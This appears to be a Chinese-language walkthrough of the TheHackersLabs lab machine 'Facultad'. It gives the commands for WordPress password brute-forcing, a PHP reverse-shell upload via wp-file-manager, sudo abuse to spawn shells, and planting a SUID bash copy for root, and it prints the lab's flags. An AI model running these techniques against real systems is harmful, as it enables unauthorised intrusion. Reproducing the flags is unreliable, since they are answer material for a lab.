# Facultad

2025.02.24 https://thehackerslabs.com/facultad/

[video](https://www.bilibili.com/video/BV1gHPWeDERV/?spm_id_from=333.1387.0.0&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

扫描目录发现 wordpress : http://192.168.5.40/education/ , 同时发现域名 facultad.thl 将其添加到 hosts 文件中，wpscan 进行扫描 http://facultad.thl/education/ ，发现用户 Facultad 和 facultad ，发现插件 akismet 和 wp-file-manager 但是这 2 个插件目前没漏洞。

```
wpscan --url http://facultad.thl/education/ -e u,ap,at,tt,cb --plugins-detection mixed
```

发现一张图片 http://192.168.5.40/images/facultad.jpg , steghide 查看存在隐写，进行解密：

```
steghide --extract -sf facultad.jpg
密码直接回车
wrote extracted data to "mensaje.txt".
```

内容翻译过来是：我将与你的邮政局联系。得到了 3 个用户名 mensaje、gabri 和 vivian ，尝试一下 hydra 简单密码爆破 ssh 没得到结果。

尝试用更大的字典 rockyou 爆破 wordpress 中的 facultad 用户的密码：

```
wpscan --url http://facultad.thl/education/ -U facultad -P /usr/share/wordlists/rockyou.txt -t 64
```

最终得到密码: asdfghjkl , 使用此密码登陆。尝试使用上传 zip 到 Theme 或者是到 Media 的方法都不行，提示文件夹无权限写入，只好看这个 wordpress 使用的 wp-file-manager 可以上传 php 文件，然后访问反弹 shell 脚本文件到 kali 上：

```
www-data@TheHackersLabs-facultad:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

先拿到了 user flag：

```
www-data@TheHackersLabs-facultad:/home/vivian$ cat user.txt
mcxvbniou345897hjbhjzx
```

sudo -l 显示 (gabri) NOPASSWD: /usr/bin/php 可以提权到 gabri：

```
sudo -u gabri php -r "system('/bin/bash');"
```

经过枚举发现邮件文件，就是前面那个 txt 中说的邮局联系你：

```
cat /var/mail/gabri/.password_vivian.bf

++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>++++++++.-----------.+++++++++++++++.---------------.+++++++++++++++++++.--.---.-.-------------.<<++++++++++++++++++++.--.++.+++.
```

Brainfuck 解码得到: lapatrona2025

应该是一个用户的密码，看看是哪个用户的，发现是 vivian 用户的，ssh 进行登陆，再次 sudo -l 发现 (ALL) NOPASSWD: /opt/vivian/script.sh 直接覆盖文件内容提权到 root：

```
echo 'cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' >> /opt/vivian/script.sh
sudo -u root /opt/vivian/script.sh
```

最后得到 root flag:

```
vivian@TheHackersLabs-facultad:~$ /tmp/rootbash -p
rootbash-5.2# cd /root
rootbash-5.2# ls
root.txt
rootbash-5.2# cat root.txt
nbfgjyui4r57834sdbhjcvhz
```
